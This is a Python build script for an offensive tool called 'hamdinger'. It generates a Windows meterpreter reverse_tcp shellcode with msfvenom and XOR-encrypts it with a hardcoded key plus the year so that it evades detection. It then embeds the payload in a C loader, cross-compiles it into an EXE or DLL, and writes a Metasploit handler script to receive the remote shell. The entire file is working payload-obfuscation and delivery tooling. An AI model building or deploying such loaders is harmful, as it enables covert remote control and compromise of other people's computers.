#! /usr/bin/env python3

import sys
import datetime
import argparse
import os
import re
import subprocess
import shutil

HAMDINGER_PRO="hamdinger_pro.c"
HAMDINGER_H="hamdinger_data.h"

# Copies and updates the hamdinger_pro.c file to reflect the key
def update_c_source(original_file, new_key):
    if not os.path.exists(original_file):
        print(f"[-] Error: {original_file} not found.")
        sys.exit(1)

    # Create timestamped filename: hamdinger_pro_20240324_1530.c
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    temp_c_file = f"hamdinger_pro_{timestamp}.c"

    with open(original_file, 'r') as f:
        content = f.read()

    # Pattern for #define HAMDINGER_PART "value"
    pattern = r'(#define\s+HAMDINGER_PART\s+")[^"]+(")'

    if not re.search(pattern, content):
        print(f"[-] Warning: #define HAMDINGER_PART not found in {original_file}.")
        return original_file # Fallback

    replacement = r'\g<1>' + new_key + r'\g<2>'
    new_content = re.sub(pattern, replacement, content)

    with open(temp_c_file, 'w') as f:
        f.write(new_content)

    print(f"[+] Created temporary source: {temp_c_file}")
    return temp_c_file

def xor_encrypt(data, key):
    """XORs data with the key, repeating the key as needed."""
    key_len = len(key)
    encrypted_data = bytearray(len(data))

    for i in range(len(data)):
        # XOR current byte of data with the corresponding key byte (key wraps around)
        # ord() converts the character to its ASCII/integer value
        encrypted_data[i] = data[i] ^ ord(key[i % key_len])

    return encrypted_data

# Generate an msf resource script
def generate_msf_rc(lport, payload, build_type, lhost='0.0.0.0', rc_file="handler.rc"):
    """Generates a Metasploit resource script tailored for EXE or DLL payloads."""
    rc_content = [
        f"use exploit/multi/handler",
        f"set PAYLOAD {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        f"set ExitOnSession false",
    ]

    # Add specialized settings for DLLs if needed
    if build_type == "DLL":
        # Stages can sometimes be finicky with DLL injection;
        # these settings help with session stability
        rc_content.append("set EnableStageEncoding true")
        rc_content.append("set StageEncoder x64/zutto_dekiru")

    rc_content.append("exploit -j -z")

    with open(rc_file, 'w') as f:
        f.write("\n".join(rc_content) + "\n")

    print(f"[+] Metasploit resource script generated for {build_type}: {rc_file}")
    print(f"[*] To start listener: msfconsole -r {rc_file}")

#Generate raw shell code with msfvenom
def payload_generate(lhost, lport, build_type, payload='windows/x64/meterpreter/reverse_tcp', p_type='raw'):
    """Generates shellcode using msfvenom."""

    # Check if msfvenom is actually installed/in path
    if not shutil.which("msfvenom"):
        print("[-] Error: msfvenom not found in PATH. Are you running this on Kali?")
        sys.exit(1)

    output_file = f"yippee.ki.yay_{build_type.lower()}.raw"

    # Construct the command
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={str(lport)}",
        "-f", p_type,
        "-o", output_file
    ]

    print(f"[*] Generating payload: {payload}...")

    try:
        # run() is the modern way to execute sub-processes
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(f"[+] Payload generated successfully: {output_file}")
        return output_file
    except subprocess.CalledProcessError as e:
        print(f"[-] Error generating payload!")
        print(f"    Stderr: {e.stderr}")
        sys.exit(1)

def compile_project(source_file, object_file, build_type, output_name=None):
    """Compiles the C source into an EXE or DLL and links syscalls.o."""

    if not shutil.which("gcc"):
        print("[-] Error: gcc not found.")
        sys.exit(1)

    # Set default output names if none provided
    if not output_name:
        output_name = "hamdinger.exe" if build_type == "EXE" else "hamdinger.dll"

    # Base GCC command
    cmd = ["x86_64-w64-mingw32-gcc", source_file, object_file, "-o", output_name, "-Wall", "-O2"]

    # Add specific flags for DLL
    if build_type == "DLL":
        cmd.append("-shared")

    print(f"[*] Compiling {build_type}: {source_file} + {object_file} -> {output_name}...")

    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        print(f"[+] {build_type} created successfully: {output_name}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed!")
        print(f"    Stderr: {e.stderr}")
        sys.exit(1)

def build_key(hardcoded_part, manual_year=None):
    """Builds the dynamic key string (String + Year)."""
    if manual_year:
        current_year = str(manual_year)
    else:
        current_year = str(datetime.datetime.now().year)

    full_key = hardcoded_part + current_year
    return full_key, current_year

def main():
    parser = argparse.ArgumentParser(
        description="Custom XOR encryption script to generate obfuscated MSF payloads.",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        '-i', '--input',
        type=str,
        help="Input raw shellcode file (required if NOT using --msf)."
    )
    parser.add_argument(
        '-o', '--output',
        type=str,
        default="hamdinger",
        help="Name of binary output file, default 'hamdinger'"
    )
    parser.add_argument(
        '-k', '--key-part',
        type=str,
        default="LudicrousGibs",
        help="The hardcoded string part of the decryption key (default: LudicrousGibs)."
    )
    parser.add_argument(
        '-y', '--year',
        type=int,
        help="Optional: Manually specify the calendar year for the key. If omitted, the current system year will be used. Within hamdinger_pro.c the year is appended to every key at runtime to provide a dynamic element."
    )
    parser.add_argument(
        '--build',
        type=str,
        choices=['EXE', 'DLL'],
        default='DLL',
        help="Compile the project as an EXE or a DLL"
    )
    parser.add_argument('--lhost', type=str, help="LHOST for msfvenom")
    parser.add_argument('--lport', type=int, default=4445, help="LPORT for msfvenom")
    parser.add_argument('--payload', type=str, default='windows/x64/meterpreter/reverse_tcp', help="Payload to use with msfvenom, default windows/x64/meterpreter/reverse_tcp")
    parser.add_argument('--msf', action='store_true', help="Use msfvenom to generate input automatically")
    args = parser.parse_args()

    if not args.msf and not args.input:
        parser.error("the following arguments are required: -i/--input (or use --msf)")

    # 1. Build the dynamic key
    FULL_KEY, YEAR_STR = build_key(args.key_part, args.year)

    b_type = args.build if args.build else "EXE"
    output_bin = f"{args.output}.{b_type.lower()}"
    if args.msf:
        if not args.lhost:
            print("[-] Error: --lhost is required when using --msf")
            sys.exit(1)
        input_file = payload_generate(args.lhost, args.lport, b_type, args.payload)
    else:
        input_file = args.input
    generate_msf_rc(args.lport, args.payload, b_type)
    # 2. Read the raw data
    try:
        with open(input_file, 'rb') as f:
            raw_data = bytearray(f.read())
    except FileNotFoundError:
        print(f"Error: Input file not found: {input_file}")
        sys.exit(1)

    # 3. Encrypt the data
    encrypted_data = xor_encrypt(raw_data, FULL_KEY)
    length = len(encrypted_data)
    # 4. Generate the C header file
    array_name = "encrypted_hamdinger"

    with open(HAMDINGER_H, 'w') as f:
        f.write(f'// Generated by custom XOR encryptor. Key base: "{args.key_part}", Year: {YEAR_STR}\n')
        f.write(f'unsigned char {array_name}[] = {{\n')

        # Format data into C array syntax
        for i in range(0, length):
            if i % 15 == 0:
                f.write('\n  ')
            f.write(f'0x{encrypted_data[i]:02x}, ')

        f.write('\n};\n')
        f.write(f'unsigned int hamdinger_len = {length};\n')

    temp_source = update_c_source(HAMDINGER_PRO, args.key_part)
    if args.build:
        compile_project(temp_source, "syscalls.o", args.build)

    print("\n" + "="*50)
    print("🚀 HAMDINGER BUILD SUMMARY")
    print("="*50)
    print(f"[*] Encryption Key : '{FULL_KEY}'")
    print(f"[*] Payload Type   : {args.payload}")
    print(f"[*] Target Arch    : x86_64 (MingW32)")
    print("-" * 50)
    print(f"[+] Generated Header : {HAMDINGER_H}")
    print(f"[+] Generated RC     : handler.rc")
    print(f"[+] Temp C Source    : {temp_source}")

    if args.build:
        print(f"[+] Final Binary     : {output_bin}")

    print("-" * 50)
    print(f"[*] Execution Ready: msfconsole -r handler.rc")
    print("="*50 + "\n")

if __name__ == "__main__":
    main()
